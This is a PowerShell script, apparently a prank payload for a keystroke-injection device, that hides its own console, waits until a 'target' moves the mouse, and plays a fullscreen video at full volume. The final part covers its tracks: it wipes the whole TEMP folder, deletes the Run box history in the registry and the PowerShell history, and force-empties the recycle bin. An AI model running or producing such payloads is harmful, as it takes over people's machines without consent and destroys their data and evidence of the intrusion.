$i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
add-type -name win -member $i -namespace native;
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);

function Target-Comes {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o = New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

#############################################################################################################################################

# WPF Library for Playing Movie and some components
Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.ComponentModel

# XAML File of WPF as windows for playing movie
[xml]$XAML = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="PowerShell Video Player" WindowState="Maximized" ResizeMode="NoResize" WindowStartupLocation="CenterScreen" >
        <MediaElement Stretch="Fill" Name="VideoPlayer" LoadedBehavior="Manual" UnloadedBehavior="Stop"  />
</Window>
"@

# Movie Path - Detecção dinâmica para funcionar tanto na raiz de extração quanto em subdiretórios
if (Test-Path "$PSScriptRoot\rr.mp4") {
    [uri]$VideoSource = "$PSScriptRoot\rr.mp4"
} elseif (Test-Path "$env:TMP\rr\rr.mp4") {
    [uri]$VideoSource = "$env:TMP\rr\rr.mp4"
} else {
    [uri]$VideoSource = "$env:TMP\rr.mp4"
}

# Divide All Objects on XAML
$XAMLReader = (New-Object System.Xml.XmlNodeReader $XAML)
$Window = [Windows.Markup.XamlReader]::Load($XAMLReader)
$VideoPlayer = $Window.FindName("VideoPlayer")

# Video Default Setting
$VideoPlayer.Volume = 100;
$VideoPlayer.Source = $VideoSource;

Target-Comes

$VideoPlayer.Play()

# Show Up the Window 
$Window.ShowDialog() | Out-Null

# Turn off capslock if it is left on
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
if ($caps -eq $true){
    $key = New-Object -ComObject WScript.Shell
    $key.SendKeys('{CapsLock}')
}

# Remove payload artifacts
Remove-Item "$env:TMP\rr.zip" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TMP\rr" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TMP\rr.mp4" -Force -ErrorAction SilentlyContinue

# Empty temp folder
Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue